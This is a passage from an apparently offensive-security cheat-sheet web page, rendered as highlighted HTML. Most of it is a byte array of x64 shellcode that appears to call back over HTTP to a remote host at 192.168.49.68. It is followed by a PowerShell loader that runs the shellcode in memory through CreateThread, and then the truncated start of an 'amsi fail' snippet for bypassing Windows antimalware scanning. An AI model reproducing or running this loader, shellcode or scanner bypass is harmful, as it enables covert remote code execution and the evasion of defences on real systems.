style="color:#ff0044;font-weight:400">0xd0</span>,<span style="color:#ff0044;font-weight:400">0xe3</span>,<span style="color:#ff0044;font-weight:400">0x56</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xc9</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xc9</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x88</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x1</span>,<span style="color:#ff0044;font-weight:400">0xd6</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0xc1</span>,<span style="color:#ff0044;font-weight:400">0xc9</span><br />,<span style="color:#ff0044;font-weight:400">0xd</span>,<span style="color:#ff0044;font-weight:400">0xac</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x1</span>,<span style="color:#ff0044;font-weight:400">0xc1</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0xe0</span>,<span style="color:#ff0044;font-weight:400">0x75</span>,<span style="color:#ff0044;font-weight:400">0xf1</span>,<span style="color:#ff0044;font-weight:400">0x4c</span>,<span style="color:#ff0044;font-weight:400">0x3</span>,<span style="color:#ff0044;font-weight:400">0x4c</span>,<span style="color:#ff0044;font-weight:400">0x24</span>,<span style="color:#ff0044;font-weight:400">0x8</span>,<span style="color:#ff0044;font-weight:400">0x45</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0xd1</span>,<span style="color:#ff0044;font-weight:400">0x75</span>,<span style="color:#ff0044;font-weight:400">0xd8</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x44</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,0x<br /><span style="color:#ff0044;font-weight:400">40</span>,<span style="color:#ff0044;font-weight:400">0x24</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0x1</span>,<span style="color:#ff0044;font-weight:400">0xd0</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0xc</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x44</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x40</span>,<span style="color:#ff0044;font-weight:400">0x1c</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0x1</span>,<span style="color:#ff0044;font-weight:400">0xd0</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x4</span>,<span style="color:#ff0044;font-weight:400">0x88</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x1</span>,<span style="color:#ff0044;font-weight:400">0</span><br />xd0,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x5e</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0xec</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xe0</span>,<br /><span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x12</span>,<span style="color:#ff0044;font-weight:400">0xe9</span>,<span style="color:#ff0044;font-weight:400">0x4b</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0x5d</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xdb</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xbe</span>,<span style="color:#ff0044;font-weight:400">0x77</span>,<span style="color:#ff0044;font-weight:400">0x69</span>,<span style="color:#ff0044;font-weight:400">0x6e</span><br />,<span style="color:#ff0044;font-weight:400">0x69</span>,<span style="color:#ff0044;font-weight:400">0x6e</span>,<span style="color:#ff0044;font-weight:400">0x65</span>,<span style="color:#ff0044;font-weight:400">0x74</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x56</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xe1</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xc7</span>,<span style="color:#ff0044;font-weight:400">0xc2</span>,<span style="color:#ff0044;font-weight:400">0x4c</span>,<span style="color:#ff0044;font-weight:400">0x77</span>,<span style="color:#ff0044;font-weight:400">0x26</span>,<span style="color:#ff0044;font-weight:400">0x7</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xd5</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<br /><span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xe1</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xc9</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xba</span>,<span style="color:#ff0044;font-weight:400">0x3a</span>,<span style="color:#ff0044;font-weight:400">0x56</span>,<span style="color:#ff0044;font-weight:400">0x79</span>,<span style="color:#ff0044;font-weight:400">0xa7</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0xf</span><br />f,<span style="color:#ff0044;font-weight:400">0xd5</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xe</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,0x<br /><span style="color:#ff0044;font-weight:400">89</span>,<span style="color:#ff0044;font-weight:400">0xc1</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xc7</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0x90</span>,<span style="color:#ff0044;font-weight:400">0x1f</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xc9</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x6a</span>,<span style="color:#ff0044;font-weight:400">0x3</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xba</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0x9f</span>,<span style="color:#ff0044;font-weight:400">0xc6</span><br />,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xd5</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x68</span>,<span style="color:#ff0044;font-weight:400">0x77</span>,<span style="color:#ff0044;font-weight:400">0x70</span>,<span style="color:#ff0044;font-weight:400">0x45</span>,<span style="color:#ff0044;font-weight:400">0x56</span>,<span style="color:#ff0044;font-weight:400">0x68</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<span style="color:#ff0044;font-weight:400">0x42</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x68</span>,<span style="color:#ff0044;font-weight:400">0x4f</span>,<br /><span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<span style="color:#ff0044;font-weight:400">0x72</span>,<span style="color:#ff0044;font-weight:400">0x77</span>,<span style="color:#ff0044;font-weight:400">0x77</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x65</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x78</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x55</span>,<span style="color:#ff0044;font-weight:400">0x6f</span>,<span style="color:#ff0044;font-weight:400">0x56</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x77</span>,<span style="color:#ff0044;font-weight:400">0x74</span>,<span style="color:#ff0044;font-weight:400">0x6c</span>,<span style="color:#ff0044;font-weight:400">0x4b</span>,<span style="color:#ff0044;font-weight:400">0x4e</span><br />,<span style="color:#ff0044;font-weight:400">0x62</span>,<span style="color:#ff0044;font-weight:400">0x6a</span>,<span style="color:#ff0044;font-weight:400">0x56</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x43</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x46</span>,<span style="color:#ff0044;font-weight:400">0x45</span>,<span style="color:#ff0044;font-weight:400">0x6b</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x46</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x44</span>,<span style="color:#ff0044;font-weight:400">0x77</span>,<span style="color:#ff0044;font-weight:400">0x68</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x72</span>,<span style="color:#ff0044;font-weight:400">0x6</span><br />d,<span style="color:#ff0044;font-weight:400">0x74</span>,<span style="color:#ff0044;font-weight:400">0x76</span>,<span style="color:#ff0044;font-weight:400">0x72</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x63</span>,<span style="color:#ff0044;font-weight:400">0x76</span>,<span style="color:#ff0044;font-weight:400">0x4e</span>,<span style="color:#ff0044;font-weight:400">0x35</span>,<span style="color:#ff0044;font-weight:400">0x44</span>,<span style="color:#ff0044;font-weight:400">0x76</span>,<span style="color:#ff0044;font-weight:400">0x42</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x68</span>,<span style="color:#ff0044;font-weight:400">0x71</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0x35</span>,<span style="color:#ff0044;font-weight:400">0x70</span>,<span style="color:#ff0044;font-weight:400">0x68</span>,0x<br /><span style="color:#ff0044;font-weight:400">33</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x4b</span>,<span style="color:#ff0044;font-weight:400">0x45</span>,<span style="color:#ff0044;font-weight:400">0x70</span>,<span style="color:#ff0044;font-weight:400">0x4f</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x46</span>,<span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x6d</span>,<span style="color:#ff0044;font-weight:400">0x73</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x6d</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x6e</span>,<span style="color:#ff0044;font-weight:400">0x72</span>,<span style="color:#ff0044;font-weight:400">0x4c</span>,<span style="color:#ff0044;font-weight:400">0x63</span>,<span style="color:#ff0044;font-weight:400">0x70</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x64</span>,<span style="color:#ff0044;font-weight:400">0</span><br />x71,<span style="color:#ff0044;font-weight:400">0x73</span>,<span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x47</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x47</span>,<span style="color:#ff0044;font-weight:400">0x4f</span>,<span style="color:#ff0044;font-weight:400">0x54</span>,<span style="color:#ff0044;font-weight:400">0x6c</span>,<span style="color:#ff0044;font-weight:400">0x68</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0x6d</span>,<span style="color:#ff0044;font-weight:400">0x4a</span>,<span style="color:#ff0044;font-weight:400">0x55</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x71</span>,<span style="color:#ff0044;font-weight:400">0x46</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<br /><span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x4e</span>,<span style="color:#ff0044;font-weight:400">0x72</span>,<span style="color:#ff0044;font-weight:400">0x69</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x74</span>,<span style="color:#ff0044;font-weight:400">0x55</span>,<span style="color:#ff0044;font-weight:400">0x6e</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x74</span>,<span style="color:#ff0044;font-weight:400">0x72</span>,<span style="color:#ff0044;font-weight:400">0x73</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x70</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xc1</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<br /><span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xc9</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0xb8</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x2</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0x84</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xc7</span>,<span style="color:#ff0044;font-weight:400">0xc2</span>,<br /><span style="color:#ff0044;font-weight:400">0xeb</span>,<span style="color:#ff0044;font-weight:400">0x55</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xd5</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xc6</span>,<span style="color:#ff0044;font-weight:400">0x6a</span>,<span style="color:#ff0044;font-weight:400">0xa</span>,<span style="color:#ff0044;font-weight:400">0x5f</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xf1</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0xc9</span>,<span style="color:#ff0044;font-weight:400">0x4d</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<br /><span style="color:#ff0044;font-weight:400">0xc9</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xc7</span>,<span style="color:#ff0044;font-weight:400">0xc2</span>,<span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x6</span>,<span style="color:#ff0044;font-weight:400">0x18</span>,<span style="color:#ff0044;font-weight:400">0x7b</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xd5</span>,<span style="color:#ff0044;font-weight:400">0x85</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0x75</span>,<span style="color:#ff0044;font-weight:400">0x1f</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0xc7</span>,<span style="color:#ff0044;font-weight:400">0xc1</span>,<span style="color:#ff0044;font-weight:400">0x88</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0</span><br />x0,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xba</span>,<span style="color:#ff0044;font-weight:400">0x44</span>,<span style="color:#ff0044;font-weight:400">0xf0</span>,<span style="color:#ff0044;font-weight:400">0x35</span>,<span style="color:#ff0044;font-weight:400">0xe0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xd5</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xcf</span>,<span style="color:#ff0044;font-weight:400">0x74</span>,<span style="color:#ff0044;font-weight:400">0x2</span>,<span style="color:#ff0044;font-weight:400">0xeb</span>,<span style="color:#ff0044;font-weight:400">0xcc</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x55</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,0x<br /><span style="color:#ff0044;font-weight:400">0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x6a</span>,<span style="color:#ff0044;font-weight:400">0x40</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xd1</span>,<span style="color:#ff0044;font-weight:400">0xc1</span>,<span style="color:#ff0044;font-weight:400">0xe2</span>,<span style="color:#ff0044;font-weight:400">0x10</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xc7</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x10</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xba</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0</span><br />xa4,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0xe5</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xd5</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x93</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xe7</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xf1</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xda</span>,<span style="color:#ff0044;font-weight:400">0x49</span><br />,<span style="color:#ff0044;font-weight:400">0xc7</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xf9</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0xba</span>,<span style="color:#ff0044;font-weight:400">0x12</span>,<span style="color:#ff0044;font-weight:400">0x96</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xe2</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xd5</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<br /><span style="color:#ff0044;font-weight:400">0xc4</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x85</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0x74</span>,<span style="color:#ff0044;font-weight:400">0xb2</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x8b</span>,<span style="color:#ff0044;font-weight:400">0x7</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x1</span>,<span style="color:#ff0044;font-weight:400">0xc3</span>,<span style="color:#ff0044;font-weight:400">0x85</span>,<span style="color:#ff0044;font-weight:400">0xc0</span>,<span style="color:#ff0044;font-weight:400">0x75</span>,<span style="color:#ff0044;font-weight:400">0xd2</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0xc3</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x6a</span>,<span style="color:#ff0044;font-weight:400">0x0</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,0x<br />bb,<span style="color:#ff0044;font-weight:400">0xe0</span>,<span style="color:#ff0044;font-weight:400">0x1d</span>,<span style="color:#ff0044;font-weight:400">0x2a</span>,<span style="color:#ff0044;font-weight:400">0xa</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0xda</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xd5</span><br />[System.Runtime.InteropServices.Marshal]::Copy($buf, <span style="color:#ff0044;font-weight:400">0</span>, $lpMem, $buf.length)<br />$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero, <span style="color:#ff0044;font-weight:400">0</span>, $lpMem, [IntPtr]::Zero, <span style="color:#ff0044;font-weight:400">0</span>, [IntPtr]::Zero)<br />[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, <span style="color:#ff0044;font-weight:400">0xFFFFFFFF</span>)</pre></div></p><p></p><p></p><p></p><p><h2>amsi fail</h2><ul><li><a href="https://amsi.fail/">https://amsi.fail/</a></p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">$x</span><span style="color:#ff9d00;font-weight:700">=</span>[Ref].Assembly.GetType(<span style="color:#333333;font-weight:400">&#39;System.Management.Automation.Am&#39;</span><span 